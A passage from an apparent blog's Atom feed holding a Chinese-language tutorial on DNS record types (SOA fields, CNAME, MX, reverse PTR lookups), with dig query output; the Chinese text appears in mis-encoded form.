180ç§’å°è¯•åˆ°è¾¾ 1209600 ç§’åï¼Œslave å°†ä¸å†æ›´æ–°ï¼Œåªèƒ½ç­‰å¾…ç³»ç»Ÿç®¡ç†å‘˜çš„å¤„ç†ã€‚</p></li><li><p>å¿«å–æ—¶é—´ (Minumum TTL)ï¼šå¦‚æœè¿™ä¸ªæ•°æ®åº“ zone file ä¸­ï¼Œæ¯ç¬” RR è®°å½•éƒ½æ²¡æœ‰å†™åˆ° TTL å¿«å–æ—¶é—´çš„è¯ï¼Œé‚£ä¹ˆå°±ä»¥è¿™ä¸ª SOA çš„è®¾å®šå€¼ä¸ºä¸»ã€‚</p><hr></li><li><p><strong>CNAME ï¼šè®¾å®šæŸä¸»æœºåçš„åˆ«å (alias)</strong></p></li></ul><p>æœ‰æ—¶å€™ä½ ä¸æƒ³è¦é’ˆå¯¹æŸä¸ªä¸»æœºåè®¾å®š A çš„æ ‡å¿—ï¼Œè€Œæ˜¯æƒ³é€è¿‡å¦å¤–ä¸€éƒ¨ä¸»æœºåçš„ A æ¥è§„èŒƒè¿™ä¸ªæ–°ä¸»æœºåæ—¶ï¼Œ å¯ä»¥ä½¿ç”¨åˆ«å (CNAME) çš„è®¾å®š </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig www.baidu.com</span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.baidu.com.INA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.baidu.com.328INCNAMEwww.a.shifen.com.</span><br><span class="line">www.a.shifen.com.34INA61.135.169.125</span><br><span class="line">www.a.shifen.com.34INA61.135.169.121</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯è¯´ï¼Œå½“ä½ è¦è¿½æŸ¥<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> æ—¶ï¼Œè¯·æ‰¾ <a href="http://www.a.shifen.com.é‚£ä¸ªä¸»æœºï¼Œè€Œé‚£ä¸ªä¸»æœºçš„" target="_blank" rel="noopener">www.a.shifen.com.é‚£ä¸ªä¸»æœºï¼Œè€Œé‚£ä¸ªä¸»æœºçš„</a> A å°±ä¸Šé¢ç¬¬äºŒè¡Œçš„æ˜¾ç¤ºäº†ã€‚  </p><p>è¿™ä¸ª CNAME æœ‰å•¥å¥½å¤„å‘¢ï¼Ÿç”¨ A å°±å¥½äº†å§ï¼Ÿå…¶å®è¿˜æ˜¯æœ‰å¥½å¤„çš„ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ª IPï¼Œè¿™ä¸ª IP æ˜¯ç»™å¾ˆå¤šä¸»æœºåä½¿ç”¨çš„ã€‚ é‚£ä¹ˆå½“ä½ çš„ IP æ›´æ”¹æ—¶ï¼Œæ‰€æœ‰çš„æ•°æ®å°±å¾—é€šé€šæ›´æ–° A æ ‡å¿—æ‰è¡Œã€‚å¦‚æœä½ åªæœ‰ä¸€ä¸ªä¸»è¦ä¸»æœºåè®¾å®š Aï¼Œè€Œå…¶ä»–çš„æ ‡å¿—ä½¿ç”¨ CNAME æ—¶ï¼Œé‚£ä¹ˆå½“ IP æ›´æ”¹ï¼Œé‚£ä½ åªè¦ä¿®è®¢ä¸€ä¸ª A çš„æ ‡å¿—ï¼Œå…¶ä»–çš„ CNAME å°±è·Ÿç€å˜åŠ¨äº†ï¼å¤„ç†èµ·æ¥æ¯”è¾ƒå®¹æ˜“å•Šï¼ </p><hr><ul><li><strong>MX ï¼šæŸ¥è¯¢æŸé¢†åŸŸåçš„é‚®ä»¶æœåŠ¡å™¨ä¸»æœºå</strong> </li></ul><p>MX æ˜¯ Mail eXchanger (é‚®ä»¶äº¤æ¢) çš„æ„æ€ï¼Œé€šå¸¸ä½ çš„æ•´ä¸ªé¢†åŸŸä¼šè®¾å®šä¸€ä¸ª MX ï¼Œä»£è¡¨ï¼Œæ‰€æœ‰å¯„ç»™è¿™ä¸ªé¢†åŸŸçš„ email åº”è¯¥è¦é€åˆ°åå¤´çš„ email server ä¸»æœºåä¸Šå¤´æ‰æ˜¯ </p><hr><h4 id="åå‘è§£æRRæ•°æ®"><a href="#åå‘è§£æRRæ•°æ®" class="headerlink" title="åå‘è§£æRRæ•°æ®"></a>åå‘è§£æRRæ•°æ®</h4><p>åœ¨è®²åè§£ä¹‹å‰ï¼Œå…ˆæ¥è°ˆè°ˆæ­£è§£ä¸»æœºåçš„è¿½è¸ªæ–¹å¼ã€‚ä»¥ <a href="http://www.api.haoshiqi.net" target="_blank" rel="noopener">www.api.haoshiqi.net</a>. æ¥è¯´ï¼Œæ•´ä¸ªç½‘åŸŸçš„æ¦‚å¿µæ¥çœ‹ï¼Œ è¶Šå³è¾¹å‡ºç°çš„åç§°ä»£è¡¨ç½‘åŸŸè¶Šå¤§ï¼ä¸¾ä¾‹æ¥è¯´ï¼Œ.(root) &gt; net &gt; haoshiqi ä»¥æ­¤ç±»æ¨ã€‚å› æ­¤è¿½è¸ªæ—¶ï¼Œæ˜¯ç”±å¤§èŒƒå›´æ‰¾åˆ°å°èŒƒå›´ï¼Œ </p><p>ä½†æ˜¯ IP åˆ™ä¸ä¸€æ ·å•Šï¼ä»¥æˆ‘ä»¬çš„114.55.224.232 æ¥è¯´å¥½äº†ï¼Œå½“ç„¶æ˜¯ 114 &gt; 55 &gt; 224 &gt; 232 ï¼Œå·¦è¾¹çš„ç½‘åŸŸæœ€å¤§ï¼ ä¸é¢„è®¾çš„ DNS ä»å³è¾¹å‘å·¦è¾¹æŸ¥è¯¢ä¸ä¸€æ ·å•Šï¼é‚£æ€åŠï¼Ÿä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥åè§£çš„ zone å°±å¿…é¡»è¦å°† IP åè¿‡æ¥å†™ï¼Œè€Œåœ¨ç»“å°¾æ—¶åŠ ä¸Š .in-addr.arpa. çš„ç»“å°¾å­—æ ·å³å¯ã€‚æ‰€ä»¥ï¼Œå½“ä½ æƒ³è¦è¿½è¸ªåè§£æ—¶ï¼Œé‚£ä¹ˆåè§£çš„ç»“æœå°±ä¼šæ˜¯ï¼š </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig -x 114.55.224.232</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;232.224.55.114.in-addr.arpa.INPTR</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">55.114.in-addr.arpa.225INSOArdns1.alidns.com. dnsmgr.alibaba-inc.com. 2015011323 1800 600 1814400 300</span><br></pre></td></tr></table></figure><p>PTRå°±æ˜¯åå‘è§£æçš„æ„æ€.è¦æ³¨æ„çš„å°±æ˜¯ zone çš„åç§°äº†ï¼è¦å°† IP åè½¬è¿‡æ¥å†™ï¼Œå¹¶ä¸”ç»“å°¾åŠ ä¸Š .in-addr.arpa. æ‰è¡Œ </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;DNSä»‹ç»&quot;&gt;&lt;a href=&quot;#DNSä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;DNSä»‹ç»&quot;&gt;&lt;/a&gt;DNSä»‹ç»&lt;/h3&gt;&lt;p&gt;IPåœ°å€è™½ç„¶é‡‡ç”¨äº†ååˆ†è®°æ•°æ³•.ä½†æ˜¯å¯¹äºäººè„‘æ¥è¯´è¿˜æ˜¯éå¸¸éš¾ä»¥è®°å¿†,ä½†æ˜¯è®¿é—®äº’è”ç½‘ç½‘ç«™åˆä¸€å®šéœ€è¦IP,ä¸ºäº†åº”å¯¹è¿™ä¸ªé—®é¢˜.æ—©æœŸçš„æ—¶å€™æ˜¯é€šè¿‡hostsæ–‡ä»¶æ¥ç»‘å®šä¸»æœºåå’ŒIPçš„å¯¹åº”å…³ç³»,&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è¿™ç§æ–¹æ³•å­˜åœ¨éå¸¸å¤šçš„ä¸è¶³,ç‰¹åˆ«æ˜¯IPå’Œä¸»æœºåçš„å¯¹åº”å…³ç³»è¶Šæ¥è¶Šå¤šçš„æ—¶å€™.hostsæ¡£æ¡ˆå®Œå…¨æ— æ³•æ»¡è¶³äººä»¬çš„éœ€æ±‚.è¿™ä¸ªæ—¶å€™,ä¼¯å…‹åˆ©å¤§å­¦å‘å±•å‡ºä¸€å¥—ä¸»æœºåIPå¯¹åº”ç³»ç»Ÿ.ç§°ä¸ºBerkeley Internet Name Domain, BIND  .ä¹Ÿå°±æ˜¯ç›®å‰å…¨ä¸–ç•Œä½¿ç”¨æœ€å¹¿æ³›çš„Domain Name System, DNS &lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Service" scheme="https://jesse.top/categories/Linux-Service/"/>
    
    
      <category term="DNS" scheme="https://jesse.top/tags/DNS/"/>
    
  </entry>
  
</feed>
